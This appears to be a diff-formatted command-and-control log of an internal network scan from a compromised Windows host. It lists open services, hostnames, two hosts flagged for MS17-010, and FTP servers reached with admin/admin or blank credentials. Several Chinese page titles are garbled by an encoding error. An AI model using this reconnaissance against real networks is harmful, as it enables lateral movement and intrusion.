+172.17.106.1:443 open
+172.17.107.1:443 open
+172.17.108.1:443 open
+172.17.108.219:443 open
+172.17.108.220:443 open
+172.17.109.1:443 open
+
+
+12/08 12:05:17 UTC [output]
+received output:
+172.17.109.254:443 open
+172.17.110.1:443 open
+172.17.110.251:443 open
+172.17.110.252:443 open
+172.17.102.2:445 open
+172.17.102.8:445 open
+172.17.102.15:445 open
+172.17.102.14:445 open
+172.17.102.16:445 open
+172.17.102.18:445 open
+172.17.102.27:445 open
+172.17.102.28:445 open
+172.17.102.40:445 open
+172.17.102.43:445 open
+172.17.102.54:445 open
+172.17.102.55:445 open
+172.17.102.59:445 open
+172.17.102.94:445 open
+172.17.102.96:445 open
+172.17.102.108:445 open
+172.17.102.113:445 open
+172.17.102.128:445 open
+172.17.102.142:445 open
+172.17.102.134:445 open
+172.17.102.140:445 open
+172.17.102.137:445 open
+172.17.102.146:445 open
+172.17.102.148:445 open
+172.17.102.157:445 open
+172.17.102.161:445 open
+172.17.102.164:445 open
+172.17.102.165:445 open
+172.17.102.179:445 open
+172.17.102.181:445 open
+172.17.102.171:445 open
+172.17.102.172:445 open
+172.17.102.200:445 open
+172.17.102.193:445 open
+172.17.102.192:445 open
+172.17.102.214:445 open
+172.17.102.213:445 open
+172.17.102.125:445 open
+172.17.102.224:445 open
+172.17.102.246:445 open
+172.17.102.228:445 open
+172.17.102.220:445 open
+172.17.102.253:445 open
+172.17.102.201:445 open
+172.17.104.52:445 open
+172.17.102.202:445 open
+172.17.103.214:445 open
+172.17.104.14:445 open
+172.17.105.250:445 open
+172.17.106.54:445 open
+172.17.105.50:445 open
+172.17.104.182:445 open
+172.17.105.135:445 open
+172.17.107.97:445 open
+172.17.105.133:445 open
+172.17.105.129:445 open
+172.17.105.44:445 open
+172.17.108.82:445 open
+172.17.108.39:445 open
+172.17.108.107:445 open
+172.17.102.207:445 open
+172.17.108.203:445 open
+172.17.108.249:445 open
+172.17.110.253:445 open
+172.17.110.208:445 open
+172.17.104.14:1433 open
+
+
+12/08 12:05:18 UTC [output]
+received output:
+172.17.104.14:3306 open
+
+
+12/08 12:05:19 UTC [output]
+received output:
+172.17.104.15:6379 open
+
+
+12/08 12:05:22 UTC [output]
+received output:
+172.17.104.14:8080 open
+172.17.108.12:8080 open
+172.17.108.31:8080 open
+172.17.108.25:8080 open
+172.17.108.86:8080 open
+172.17.108.154:8080 open
+172.17.108.137:8080 open
+172.17.108.201:8080 open
+172.17.108.202:8080 open
+172.17.108.208:8080 open
+172.17.108.214:8080 open
+172.17.108.218:8080 open
+172.17.108.219:8080 open
+172.17.108.220:8080 open
+
+
+12/08 12:05:29 UTC [output]
+received output:
+172.17.104.15:90 open
+
+
+12/08 12:05:43 UTC [output]
+received output:
+172.17.102.9:3128 open
+
+
+12/08 12:05:54 UTC [output]
+received output:
+172.17.102.16:7680 open
+172.17.102.27:7680 open
+172.17.102.40:7680 open
+172.17.102.43:7680 open
+172.17.102.54:7680 open
+172.17.102.55:7680 open
+172.17.102.59:7680 open
+172.17.102.128:7680 open
+172.17.102.134:7680 open
+172.17.102.137:7680 open
+172.17.102.140:7680 open
+172.17.102.146:7680 open
+172.17.102.148:7680 open
+172.17.102.157:7680 open
+172.17.102.161:7680 open
+172.17.102.164:7680 open
+172.17.102.171:7680 open
+172.17.102.172:7680 open
+172.17.102.181:7680 open
+172.17.102.192:7680 open
+172.17.102.202:7680 open
+172.17.102.201:7680 open
+172.17.102.213:7680 open
+172.17.102.228:7680 open
+172.17.102.246:7680 open
+172.17.102.253:7680 open
+172.17.104.182:7680 open
+
+
+12/08 12:06:00 UTC [output]
+received output:
+172.17.104.14:8009 open
+
+
+12/08 12:06:11 UTC [output]
+received output:
+172.17.110.13:8081 open
+172.17.110.116:8081 open
+172.17.110.229:8081 open
+172.17.110.253:8081 open
+
+
+12/08 12:06:12 UTC [output]
+received output:
+172.17.110.253:8083 open
+
+
+12/08 12:06:13 UTC [output]
+received output:
+172.17.104.52:8086 open
+172.17.110.253:8086 open
+
+
+12/08 12:06:14 UTC [output]
+received output:
+172.17.104.14:8090 open
+
+
+12/08 12:06:15 UTC [output]
+received output:
+172.17.110.253:8090 open
+
+
+12/08 12:06:16 UTC [output]
+received output:
+172.17.110.253:8092 open
+
+
+12/08 12:06:19 UTC [output]
+received output:
+172.17.110.253:8098 open
+
+
+12/08 12:06:29 UTC [output]
+received output:
+172.17.100.2:8443 open
+
+
+12/08 12:06:35 UTC [output]
+received output:
+172.17.100.2:8888 open
+
+
+12/08 12:06:38 UTC [output]
+received output:
+172.17.102.205:9002 open
+
+
+12/08 12:06:40 UTC [output]
+received output:
+172.17.104.14:9080 open
+
+
+12/08 12:06:46 UTC [output]
+received output:
+172.17.102.205:9090 open
+172.17.104.15:9090 open
+
+
+12/08 12:06:57 UTC [output]
+received output:
+172.17.110.253:10001 open
+172.17.104.15:10002 open
+
+
+12/08 12:06:59 UTC [output]
+received output:
+172.17.105.250:10250 open
+
+
+12/08 12:07:06 UTC [output]
+received output:
+172.17.110.251:18082 open
+
+
+12/08 12:07:13 UTC [output]
+received output:
+172.17.110.253:3389 open
+
+
+12/08 12:07:15 UTC [output]
+received output:
+[*] alive ports len is: 514
+start vulscan
+[+] NetInfo:
+[*]172.17.104.14
+   [->]WIN-A694SCMAFA1
+   [->]172.17.104.14
+[+] NetInfo:
+[*]172.17.110.253
+   [->]WIN-5RCFU5VD4RU
+   [->]172.17.110.253
+[+] NetInfo:
+[*]172.17.102.146
+   [->]win10-0064
+   [->]172.17.102.146
+[*] WebTitle:http://172.17.104.15      code:200 len:29528  title:  
+[*] WebTitle:http://172.17.108.12      code:302 len:199    title:None 璺宠浆url: http://172.17.108.12/login.asp
+[*] WebTitle:http://172.17.102.9       code:200 len:9488   title:None
+[*] WebTitle:http://172.17.108.86      code:302 len:199    title:None 璺宠浆url: http://172.17.108.86/login.asp
+[*] WebTitle:http://172.17.108.25      code:302 len:199    title:None 璺宠浆url: http://172.17.108.25/login.asp
+[*] WebTitle:http://172.17.108.154     code:302 len:200    title:None 璺宠浆url: http://172.17.108.154/login.asp
+[*] WebTitle:http://172.17.108.137     code:302 len:200    title:None 璺宠浆url: http://172.17.108.137/login.asp
+[*] WebTitle:http://172.17.102.2       code:302 len:22     title:None 璺宠浆url: https://172.17.102.2/
+[*] WebTitle:http://172.17.102.3       code:302 len:22     title:None 璺宠浆url: https://172.17.102.3/
+[*] WebTitle:http://172.17.108.31      code:302 len:199    title:None 璺宠浆url: http://172.17.108.31/login.asp
+[+] NetInfo:
+[*]172.17.102.172
+   [->]win10-0059
+   [->]172.17.102.172
+[+] NetInfo:
+[*]172.17.102.108
+   [->]win10-0014
+   [->]172.17.102.108
+[+] NetInfo:
+[*]172.17.102.161
+   [->]win10-0053
+   [->]172.17.102.161
+[+] NetInfo:
+[*]172.17.102.220
+   [->]win10-0005
+   [->]172.17.102.220
+[+] NetInfo:
+[*]172.17.102.213
+   [->]win10-0022
+   [->]172.17.102.213
+[+] NetInfo:
+[*]172.17.102.224
+   [->]win10-0094
+   [->]172.17.102.224
+[+] NetInfo:
+[*]172.17.108.203
+   [->]User-2020UHYGCK
+   [->]172.17.108.203
+[+] NetInfo:
+[*]172.17.102.171
+   [->]win10-0036
+   [->]172.17.102.171
+[+] NetInfo:
+[*]172.17.102.192
+   [->]win10-0031
+   [->]172.17.102.192
+
+
+12/08 12:07:16 UTC [output]
+received output:
+[+] NetInfo:
+[*]172.17.108.82
+   [->]BF-202304071604
+   [->]172.17.108.82
+[+] NetInfo:
+[*]172.17.102.113
+   [->]win10-0035
+   [->]172.17.102.113
+[*] WebTitle:http://172.17.108.202     code:302 len:200    title:None 璺宠浆url: http://172.17.108.202/login.asp
+[+] NetInfo:
+[*]172.17.102.181
+   [->]win10-0011
+   [->]172.17.102.181
+[+] NetInfo:
+[*]172.17.102.193
+   [->]win10-0015
+   [->]172.17.102.193
+[+] NetInfo:
+[*]172.17.102.202
+   [->]win10-0037
+   [->]172.17.102.202
+[+] NetInfo:
+[*]172.17.102.55
+   [->]win10-0018
+   [->]172.17.102.55
+[*] WebTitle:http://172.17.108.218     code:302 len:200    title:None 璺宠浆url: http://172.17.108.218/login.asp
+[+] NetInfo:
+[*]172.17.102.137
+   [->]win10-0041
+   [->]172.17.102.137
+[*] WebTitle:http://172.17.108.214     code:302 len:200    title:None 璺宠浆url: http://172.17.108.214/login.asp
+[*] WebTitle:http://172.17.102.8       code:302 len:22     title:None 璺宠浆url: https://172.17.102.8/
+[+] NetInfo:
+[*]172.17.102.140
+   [->]win10-0049
+   [->]172.17.102.140
+[*] WebTitle:http://172.17.108.220     code:302 len:204    title:None 璺宠浆url: http://172.17.108.220/login.html
+[*] WebTitle:http://172.17.108.208     code:302 len:200    title:None 璺宠浆url: http://172.17.108.208/login.asp
+[*] WebTitle:http://172.17.109.254     code:400 len:11     title:None 璺宠浆url: https://172.17.109.254/view/login.html
+[*] 172.17.104.14  (Windows Server 2008 R2 Standard 7601 Service Pack 1)
+[+] NetInfo:
+[*]172.17.102.246
+   [->]win10-0026
+   [->]172.17.102.246
+[*] WebTitle:http://172.17.101.8       code:400 len:0      title:None
+[*] WebTitle:http://172.17.101.6       code:400 len:0      title:None
+[+] NetInfo:
+[*]172.17.105.250
+   [->]DESKTOP-U1PI9IJ
+   [->]172.17.105.250
+[+] NetInfo:
+[*]172.17.102.15
+   [->]win10-0004
+   [->]172.17.102.15
+[+] NetInfo:
+[*]172.17.102.228
+   [->]win10-0001
+   [->]172.17.102.228
+[*] WebTitle:http://172.17.101.14      code:400 len:0      title:None
+[+] NetInfo:
+[*]172.17.102.18
+   [->]win10-0048
+   [->]172.17.102.18
+[*] 172.17.106.54  (Windows 6.1)
+[*] 172.17.102.181       WORKGROUP\WIN10-0011        
+[*] 172.17.103.214  (Windows 6.1)
+[*] 172.17.104.182       WORKGROUP\DESKTOP-A9CKCS4   
+[*] WebTitle:http://172.17.101.3       code:400 len:0      title:None
+[*] WebTitle:http://172.17.101.9       code:400 len:0      title:None
+[+] NetInfo:
+[*]172.17.102.207
+   [->]win10-0027
+   [->]172.17.102.207
+[*] WebTitle:http://172.17.101.11      code:400 len:0      title:None
+[*] 172.17.105.133  (Windows 6.1)
+[*] 172.17.105.129  (Windows 6.1)
+[*] WebTitle:http://172.17.101.18      code:400 len:0      title:None
+[+] NetInfo:
+[*]172.17.102.157
+   [->]win10-0007
+   [->]172.17.102.157
+[+] NetInfo:
+[*]172.17.102.179
+   [->]win10-0046
+   [->]172.17.102.179
+[*] WebTitle:http://172.17.101.16      code:400 len:0      title:None
+[+] NetInfo:
+[*]172.17.102.125
+   [->]win10-0009
+   [->]172.17.102.125
+[+] NetInfo:
+[*]172.17.104.52
+   [->]WIN-7F7M8GHRP5F
+   [->]172.17.104.52
+   [->]2001:0:348b:fb58:487:55d:53ee:97cb
+[*] 172.17.110.253       WORKGROUP\WIN-5RCFU5VD4RU   Windows Server 2012 R2 Standard 9600
+[+] NetInfo:
+[*]172.17.104.182
+   [->]DESKTOP-A9CKCS4
+   [->]172.17.104.182
+[*] WebTitle:http://172.17.101.13      code:400 len:0      title:None
+[*] WebTitle:https://172.17.102.8      code:302 len:0      title:None 璺宠浆url: https://172.17.102.8/login.pl
+[*] 172.17.102.8  (Windows 6.1)
+[*] 172.17.102.2  (Windows 6.1)
+[+] NetInfo:
+[*]172.17.102.40
+   [->]win10-0042
+   [->]172.17.102.40
+[+] 172.17.104.52	MS17-010	(Windows Server 2016 Datacenter 14393)
+[+] NetInfo:
+[*]172.17.102.148
+   [->]win10-0078
+   [->]172.17.102.148
+[+] NetInfo:
+[*]172.17.110.208
+   [->]1-PC
+   [->]172.17.110.208
+[+] NetInfo:
+[*]172.17.102.165
+   [->]win10-0076
+   [->]172.17.102.165
+[*] WebTitle:http://172.17.108.86:8080 code:200 len:31     title:None
+[*] WebTitle:http://172.17.101.12      code:400 len:0      title:None
+[*] WebTitle:http://172.17.108.31:8080 code:200 len:31     title:None
+[*] 172.17.104.52        WORKGROUP\WIN-7F7M8GHRP5F   Windows Server 2016 Datacenter 14393
+[*] 172.17.103.214       WORKGROUP\USER              Windows 6.1
+[*] WebTitle:http://172.17.102.4       code:302 len:22     title:None 璺宠浆url: https://172.17.102.4/
+[*] WebTitle:http://172.17.101.10      code:400 len:0      title:None
+[*] WebTitle:http://172.17.101.7       code:400 len:0      title:None
+[*] WebTitle:http://172.17.101.20      code:400 len:0      title:None
+[*] WebTitle:http://172.17.101.2       code:400 len:0      title:None
+[+] NetInfo:
+[*]172.17.102.128
+   [->]win10-0032
+   [->]172.17.102.128
+[*] WebTitle:http://172.17.102.205:9002 code:307 len:63     title:None 璺宠浆url: https://172.17.102.205:9180
+[*] WebTitle:http://172.17.101.21      code:400 len:0      title:None
+[*] 172.17.105.44  (Windows 6.1)
+[*] 172.17.105.133       WORKGROUP\USER              Windows 6.1
+[*] 172.17.108.39  (Windows 6.1)
+[*] WebTitle:https://172.17.102.9      code:200 len:9480   title:None
+[*] WebTitle:https://172.17.102.3      code:302 len:0      title:None 璺宠浆url: https://172.17.102.3/login.pl
+[*] 172.17.107.97        WORKGROUP\USER              Windows 6.1
+[+] NetInfo:
+[*]172.17.102.200
+   [->]win10-0008
+   [->]172.17.102.200
+[*] WebTitle:http://172.17.104.15:90   code:403 len:212    title:403 Forbidden
+[*] 172.17.105.44        WORKGROUP\USER              Windows 6.1
+[*] 172.17.105.129       WORKGROUP\USER              Windows 6.1
+[*] 172.17.105.50  (Windows 6.1)
+[*] 172.17.108.39        WORKGROUP\USER              Windows 6.1
+[*] 172.17.105.50        WORKGROUP\USER              Windows 6.1
+[*] WebTitle:http://172.17.110.253:10001 code:200 len:612    title:Welcome to nginx!
+[*] WebTitle:http://172.17.108.12:8080 code:200 len:31     title:None
+[*] WebTitle:http://172.17.103.1       code:400 len:0      title:None
+[*] 172.17.107.97  (Windows 6.1)
+[*] WebTitle:http://172.17.100.1       code:400 len:0      title:None
+[*] WebTitle:http://172.17.108.214:8080 code:200 len:31     title:None
+[*] WebTitle:http://172.17.101.23      code:400 len:0      title:None
+[*] WebTitle:http://172.17.102.1       code:400 len:0      title:None
+[*] WebTitle:http://172.17.104.1       code:400 len:0      title:None
+[*] WebTitle:http://172.17.101.1       code:400 len:0      title:None
+[*] WebTitle:http://172.17.108.220:8080 code:405 len:1825   title:None
+[*] WebTitle:https://172.17.104.94     code:302 len:0      title:None 璺宠浆url: https://172.17.104.94/login.html
+[*] WebTitle:http://172.17.107.1       code:400 len:0      title:None
+[*] WebTitle:https://172.17.102.4      code:302 len:0      title:None 璺宠浆url: https://172.17.102.4/login.pl
+[*] WebTitle:http://172.17.105.1       code:400 len:0      title:None
+[*] WebTitle:http://172.17.108.219     code:302 len:204    title:None 璺宠浆url: http://172.17.108.219/login.html
+[*] WebTitle:http://172.17.106.1       code:400 len:0      title:None
+[*] 172.17.108.107       WORKGROUP\USER              Windows 6.1
+[*] 172.17.110.208       __MSBROWSE__\1-PC              Windows 7 Professional 7601 Service Pack 1
+[*] WebTitle:http://172.17.104.52:8086 code:200 len:16666  title:None
+[*] WebTitle:http://172.17.104.15:9090 code:200 len:29528  title:  
+[*] WebTitle:http://172.17.101.4       code:400 len:0      title:None
+[+] NetInfo:
+[*]172.17.102.27
+   [->]win10-0044
+   [->]172.17.102.27
+[*] WebTitle:https://172.17.104.15     code:200 len:29528  title:  
+[*] WebTitle:http://172.17.101.19      code:400 len:0      title:None
+[*] WebTitle:http://172.17.101.22      code:400 len:0      title:None
+[*] WebTitle:http://172.17.101.15      code:400 len:0      title:None
+[*] WebTitle:http://172.17.108.201     code:302 len:200    title:None 璺宠浆url: http://172.17.108.201/login.asp
+[*] WebTitle:http://172.17.108.137:8080 code:200 len:31     title:None
+[*] 172.17.104.14        WORKGROUP\WIN-A694SCMAFA1   Windows Server 2008 R2 Standard 7601 Service Pack 1
+[*] 172.17.108.107  (Windows 6.1)
+[*] WebTitle:http://172.17.108.154:8080 code:200 len:31     title:None
+[*] WebTitle:https://172.17.102.2      code:302 len:0      title:None 璺宠浆url: https://172.17.102.2/login.pl
+[*] WebTitle:https://172.17.102.205:9090 code:200 len:42044  title:Loading...
+[*] WebTitle:http://172.17.108.202:8080 code:200 len:31     title:None
+[*] WebTitle:http://172.17.101.17      code:400 len:0      title:None
+[*] 172.17.108.249  (Windows 6.1)
+[*] WebTitle:http://172.17.102.9:3128  code:400 len:3503   title:ERROR: The requested URL could not be retrieved
+[+] NetInfo:
+[*]172.17.102.214
+   [->]win10-0043
+   [->]172.17.102.214
+[*] 172.17.108.82  (Windows 10 Pro 19045)
+[*] WebTitle:http://172.17.108.201:8080 code:200 len:31     title:None
+[*] 172.17.105.135  (Windows 6.1)
+[*] 172.17.106.54        WORKGROUP\USER              Windows 6.1
+[*] WebTitle:http://172.17.108.218:8080 code:200 len:31     title:None
+[*] WebTitle:http://172.17.108.219:8080 code:405 len:1825   title:None
+[*] WebTitle:http://172.17.104.14:8090 code:200 len:9719   title:Office Anywhere 2017鐗� 缃戠粶鏅鸿兘鍔炲叕绯荤粺
+[*] WebTitle:http://172.17.108.25:8080 code:200 len:31     title:None
+[*] WebTitle:http://172.17.104.14:8080 code:200 len:368    title:None
+[*] 172.17.108.249       WORKGROUP\USER              Windows 6.1
+[+] NetInfo:
+[*]172.17.102.28
+   [->]win10-0045
+   [->]172.17.102.28
+[*] 172.17.105.135       WORKGROUP\USER              Windows 6.1
+[*] WebTitle:http://172.17.108.12/login.asp code:200 len:2577   title:鏂拌浜戠紪鐮佹満绠＄悊绯荤粺
+[+] 172.17.110.208	MS17-010	(Windows 7 Professional 7601 Service Pack 1)
+[*] WebTitle:http://172.17.108.208:8080 code:200 len:31     title:None
+[*] WebTitle:http://172.17.108.25/login.asp code:200 len:2577   title:鏂拌浜戠紪鐮佹満绠＄悊绯荤粺
+[+] NetInfo:
+[*]172.17.102.43
+   [->]win10-0038
+   [->]172.17.102.43
+[*] WebTitle:http://172.17.110.253:8098 code:404 len:648    title:HTTP鐘舵€� 404 - 鏈壘鍒�
+[*] WebTitle:https://172.17.110.252    code:200 len:1033   title:娣变俊鏈嶅畨鍏ㄩ殧绂讳笌淇℃伅鍗曞悜瀵煎叆绯荤粺
+[*] WebTitle:http://172.17.110.253:8081 code:404 len:648    title:HTTP鐘舵€� 404 - 鏈壘鍒�
+[*] WebTitle:http://172.17.108.86/login.asp code:200 len:2577   title:鏂拌浜戠紪鐮佹満绠＄悊绯荤粺
+[+] NetInfo:
+[*]172.17.102.201
+   [->]win10-0017
+   [->]172.17.102.201
+[*] WebTitle:http://172.17.108.154/login.asp code:200 len:2577   title:鏂拌浜戠紪鐮佹満绠＄悊绯荤粺
+[*] WebTitle:http://172.17.108.31/login.asp code:200 len:2577   title:鏂拌浜戠紪鐮佹満绠＄悊绯荤粺
+[*] WebTitle:http://172.17.108.137/login.asp code:200 len:2576   title:鏂拌浜戠紪鐮佹満绠＄悊绯荤粺
+[*] WebTitle:http://172.17.110.253:8090 code:404 len:648    title:HTTP鐘舵€� 404 - 鏈壘鍒�
+[*] WebTitle:http://172.17.110.253:8086 code:404 len:648    title:HTTP鐘舵€� 404 - 鏈壘鍒�
+[*] WebTitle:http://172.17.110.253:8092 code:404 len:648    title:HTTP鐘舵€� 404 - 鏈壘鍒�
+[*] WebTitle:http://172.17.110.253:8083 code:404 len:431    title:HTTP Status 404 鈥� Not Found
+[+] NetInfo:
+[*]172.17.102.16
+   [->]win10-0016
+   [->]172.17.102.16
+[*] WebTitle:http://172.17.108.208/login.asp code:200 len:2577   title:鏂拌浜戠紪鐮佹満绠＄悊绯荤粺
+[+] InfoScan:http://172.17.102.9       [娣变俊鏈峴sl-vpn] 
+[+] NetInfo:
+[*]172.17.102.59
+   [->]win10-0051
+   [->]172.17.102.59
+[+] NetInfo:
+[*]172.17.102.134
+   [->]win10-0024
+   [->]172.17.102.134
+[+] NetInfo:
+[*]172.17.102.14
+   [->]win10-0012
+   [->]172.17.102.14
+[+] NetInfo:
+[*]172.17.102.142
+   [->]win10-0034
+   [->]172.17.102.142
+[*] WebTitle:http://172.17.108.214/login.asp code:200 len:2577   title:鏂拌浜戠紪鐮佹満绠＄悊绯荤粺
+[*] WebTitle:http://172.17.108.218/login.asp code:200 len:2577   title:鏂拌浜戠紪鐮佹満绠＄悊绯荤粺
+[*] WebTitle:http://172.17.104.14      code:302 len:116    title:瀵硅薄宸茬Щ鍔� 璺宠浆url: http://172.17.104.14/qpoaweb/login.aspx
+[*] WebTitle:http://172.17.104.52      code:200 len:703    title:IIS Windows Server
+[*] WebTitle:https://172.17.101.17     code:400 len:0      title:None
+[*] WebTitle:http://172.17.110.251:18082 code:403 len:77     title:None
+[*] WebTitle:http://172.17.104.14:9080 code:200 len:9680   title:鏅鸿兘鏂囦欢娴佽浆鏌滅鐞嗗钩鍙�
+[*] WebTitle:https://172.17.110.251    code:200 len:1033   title:娣变俊鏈嶅畨鍏ㄩ殧绂讳笌淇℃伅鍗曞悜瀵煎叆绯荤粺
+[*] WebTitle:https://172.17.101.15     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.2      code:400 len:0      title:None
+[*] WebTitle:http://172.17.108.202/login.asp code:200 len:2577   title:鏂拌浜戠紪鐮佹満绠＄悊绯荤粺
+[*] WebTitle:https://172.17.101.20     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.18     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.4      code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.16     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.13     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.19     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.10     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.21     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.23     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.9      code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.11     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.3      code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.22     code:400 len:0      title:None
+[*] WebTitle:https://172.17.102.8/login.pl code:200 len:2494   title:Login
+[*] WebTitle:https://172.17.102.8/login.pl code:200 len:2494   title:Login
+[*] WebTitle:https://172.17.109.254    code:400 len:11     title:None 璺宠浆url: https://172.17.109.254/view/login.html
+[*] WebTitle:https://172.17.101.8      code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.12     code:400 len:0      title:None
+[+] InfoScan:http://172.17.104.14:8090 [閫氳揪OA] 
+[*] WebTitle:https://172.17.101.7      code:400 len:0      title:None
+[+] InfoScan:https://172.17.102.9      [娣变俊鏈峴sl-vpn] 
+[*] WebTitle:https://172.17.102.3/login.pl code:200 len:2494   title:Login
+[*] WebTitle:https://172.17.101.14     code:400 len:0      title:None
+[*] WebTitle:https://172.17.102.2/login.pl code:200 len:2494   title:Login
+[*] WebTitle:https://172.17.102.4/login.pl code:200 len:2494   title:Login
+[*] WebTitle:http://172.17.108.201/login.asp code:200 len:2577   title:鏂拌浜戠紪鐮佹満绠＄悊绯荤粺
+[*] 172.17.108.203  (Windows 7 Ultimate 7601 Service Pack 1)
+[*] WebTitle:https://172.17.101.6      code:400 len:0      title:None
+[*] WebTitle:https://172.17.102.3/login.pl code:200 len:2494   title:Login
+[*] WebTitle:https://172.17.101.4      code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.19     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.2      code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.11     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.23     code:400 len:0      title:None
+[*] WebTitle:http://172.17.108.220/login.html code:200 len:3092   title:鐧诲綍
+[*] WebTitle:https://172.17.101.13     code:400 len:0      title:None
+
+
+12/08 12:07:17 UTC [output]
+received output:
+[*] WebTitle:https://172.17.109.254/view/login.html code:400 len:11     title:None
+[*] WebTitle:https://172.17.101.3      code:400 len:0      title:None
+[*] WebTitle:https://172.17.102.2/login.pl code:200 len:2494   title:Login
+[*] WebTitle:https://172.17.101.9      code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.6      code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.22     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.18     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.21     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.12     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.20     code:400 len:0      title:None
+[*] WebTitle:https://172.17.102.4/login.pl code:200 len:2494   title:Login
+[*] WebTitle:https://172.17.101.10     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.16     code:400 len:0      title:None
+[*] WebTitle:http://172.17.108.219/login.html code:200 len:3092   title:鐧诲綍
+[*] WebTitle:http://172.17.108.1       code:400 len:0      title:None
+[*] WebTitle:http://172.17.109.1       code:400 len:0      title:None
+[*] WebTitle:http://172.17.110.1       code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.17     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.7      code:400 len:0      title:None
+[*] WebTitle:https://172.17.104.94/login.html code:200 len:3456   title:Loading...
+[*] WebTitle:https://172.17.101.15     code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.8      code:400 len:0      title:None
+[*] WebTitle:https://172.17.108.219    code:302 len:205    title:None 璺宠浆url: https://172.17.108.219/login.html
+
+
+12/08 12:07:18 UTC [output]
+received output:
+[*] WebTitle:https://172.17.103.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.100.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.104.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.105.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.102.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.105.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.110.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.14     code:400 len:0      title:None
+[*] WebTitle:https://172.17.108.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.106.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.106.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.102.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.104.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.101.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.107.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.103.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.108.220    code:302 len:205    title:None 璺宠浆url: https://172.17.108.220/login.html
+[*] WebTitle:https://172.17.100.2:8888 code:200 len:8107   title:鐢ㄦ埛鐧诲綍
+
+
+12/08 12:07:19 UTC [output]
+received output:
+[*] WebTitle:https://172.17.109.254/view/login.html code:400 len:11     title:None
+
+
+12/08 12:07:21 UTC [output]
+received output:
+[*] WebTitle:https://172.17.108.219/login.html code:200 len:3092   title:鐧诲綍
+
+
+12/08 12:07:22 UTC [output]
+received output:
+[*] WebTitle:https://172.17.108.220/login.html code:200 len:3092   title:鐧诲綍
+
+
+12/08 12:07:23 UTC [output]
+received output:
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+
+
+12/08 12:07:24 UTC [output]
+received output:
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+
+
+12/08 12:07:25 UTC [output]
+received output:
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+
+
+12/08 12:07:28 UTC [output]
+received output:
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+
+
+12/08 12:07:30 UTC [output]
+received output:
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+
+
+12/08 12:07:31 UTC [output]
+received output:
+[+] ftp://172.17.108.220:21:admin admin
+   [->]000001_19700101
+   [->]000002_19700101
+   [->]lost+found
+
+
+12/08 12:07:33 UTC [output]
+received output:
+[+] ftp://172.17.108.219:21:admin 
+   [->]000734_20230712
+   [->]000735_20230713
+   [->]000736_20230714
+   [->]000737_20230715
+   [->]000738_20230716
+   [->]000739_20230717
+
+
+12/08 12:07:40 UTC [output]
+received output:
+[-]ParseResponse error:  read tcp 172.17.104.14:65122->172.17.102.8:443: wsarecv: An established connection was aborted by the software in your host machine.
+[-]ParseResponse error:  read tcp 172.17.104.14:64803->172.17.102.4:443: wsarecv: An established connection was aborted by the software in your host machine.
+
+
+12/08 12:07:42 UTC [output]
+received output:
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+
+
+12/08 12:07:43 UTC [output]
+received output:
+[-]ParseResponse error:  read tcp 172.17.104.14:50425->172.17.102.4:443: wsarecv: An established connection was aborted by the software in your host machine.
+
+
+12/08 12:07:44 UTC [output]
+received output:
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+[-]ParseResponse error:  read tcp 172.17.104.14:50991->172.17.102.8:443: wsarecv: An established connection was aborted by the software in your host machine.
+
+
+12/08 12:07:45 UTC [output]
+received output:
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
